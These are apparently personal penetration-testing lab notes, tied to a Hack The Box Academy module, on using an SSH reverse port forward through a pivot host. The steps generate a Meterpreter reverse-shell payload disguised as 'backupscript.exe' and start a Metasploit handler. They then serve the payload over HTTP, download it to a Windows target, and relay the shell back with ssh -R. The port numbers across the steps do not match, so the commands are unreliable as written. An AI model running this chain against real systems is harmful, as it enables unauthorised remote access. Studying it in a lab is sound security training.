#############################################
Remote-Reverse Port Forwarding with SSH
#############################################

Date: 2024-11-02 14:33

Status:

Tags: 
 
************************
Creating a Pivot host
************************

Example 1:  Using a pivot host to deliver a payload and establish a reverse shell

Step 1:  Create the payload

.. code-block:: console

     msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

Step 2: Configure and start the multi handler

.. code-block:: console

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8000
    lport => 8000
    msf6 exploit(multi/handler) > run

    [*] Started HTTPS reverse handler on https://0.0.0.0:8000

Step 3: Transfer payload to the pivot host

.. code-block:: console

    scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

Step 4:  Start a webserver on the pivot host

.. code-block:: console

    ubuntu@Webserver$ python3 -m http.server 8080

Step 5: Download the payload to the Windows target

.. code-block:: console

    PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"


Once the payload is downloaded we can use SSH port forwarding to forward connections from the pivot host back to Meterpreters handler

.. code-block:: console

    ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

Check the Meterpreter console for a shell

*************************** 
References
***************************
https://academy.hackthebox.com/module/158/section/1427
